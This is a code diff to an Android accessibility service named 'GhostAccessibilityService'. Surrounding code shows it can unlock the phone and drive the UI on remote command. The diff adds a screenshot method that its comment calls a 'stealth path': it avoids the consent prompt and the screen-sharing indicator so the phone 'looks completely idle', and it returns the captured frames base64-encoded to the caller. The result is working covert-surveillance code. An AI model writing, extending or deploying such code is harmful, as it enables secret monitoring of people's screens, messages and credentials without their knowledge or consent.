@@ -1,15 +1,23 @@
 package com.tg.ghosta
 
 import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
 import android.accessibilityservice.GestureDescription
+import android.graphics.Bitmap
 import android.graphics.Path
 import android.graphics.Rect
+import android.os.Build
 import android.os.Bundle
 import android.os.SystemClock
+import android.util.Base64
+import android.view.Display
 import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import android.app.Instrumentation
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.CountDownLatch
+import java.util.concurrent.TimeUnit
 
 /**
  * The sidekick accessibility service. Generic UI-driving verbs only — no
@@ -400,8 +408,77 @@ class GhostAccessibilityService : AccessibilityService(), UiDriver {
         return CommandRouter.ok(mapOf("what" to "unlock", "typed" to typed, "steps" to steps))
     }
 
-    override fun setArmed(on: Boolean): Map<String, Any?> {
-        armed = on
+    /**
+     * Silent screenshot via the accessibility capability.
+     *
+     * This is the stealth path: unlike MediaProjection it shows NO consent
+     * sheet and NO "screen is being shared" indicator in the status bar —
+     * the phone looks completely idle while frames are taken. Requires
+     * android:canTakeScreenshot="true" (Android 11+). The framework throttles
+     * calls (~3/s), hence the "throttled" error the caller can retry.
+     */
+    override fun screenshot(format: String, quality: Int): Map<String, Any?> {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            return CommandRouter.err("accessibility screenshots need Android 11+")
+        }
+        val latch = CountDownLatch(1)
+        var bmp: Bitmap? = null
+        var error: String? = null
+        takeScreenshot(
+            Display.DEFAULT_DISPLAY,
+            mainExecutor,
+            object : TakeScreenshotCallback {
+                override fun onSuccess(result: ScreenshotResult) {
+                    try {
+                        val hb = result.hardwareBuffer
+                        bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace)
+                            ?.copy(Bitmap.Config.ARGB_8888, false)
+                        hb.close()
+                    } catch (e: Exception) {
+                        error = "decode: ${e.message}"
+                    }
+                    latch.countDown()
+                }
+
+                override fun onFailure(errorCode: Int) {
+                    error = when (errorCode) {
+                        ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT ->
+                            "throttled: wait ~400ms and retry"
+                        ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS ->
+                            "accessibility access lost — re-enable the service"
+                        ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "invalid display"
+                        else -> "screenshot failed (code $errorCode)"
+                    }
+                    latch.countDown()
+                }
+            }
+        )
+        if (!latch.await(8, TimeUnit.SECONDS)) return CommandRouter.err("screenshot timeout")
+        val b = bmp ?: return CommandRouter.err(error ?: "screenshot failed")
+        return try {
+            val png = format.equals("png", true)
+            val out = ByteArrayOutputStream()
+            b.compress(
+                if (png) Bitmap.CompressFormat.PNG else Bitmap.CompressFormat.JPEG,
+                quality.coerceIn(10, 100), out
+            )
+            CommandRouter.ok(
+                mapOf(
+                    "format" to if (png) "png" else "jpeg",
+                    "width" to b.width,
+                    "height" to b.height,
+                    "bytes" to out.size(),
+                    "b64" to Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
+                )
+            )
+        } catch (e: Exception) {
+            CommandRouter.err("encode: ${e.message}")
+        } finally {
+            b.recycle()
+        }
+    }
+
+    override fun setArmed(on: Boolean): Map<String, Any?> {        armed = on
         if (!on) lastAutoTapKey = ""
         return CommandRouter.ok(mapOf("armed" to armed))
     }
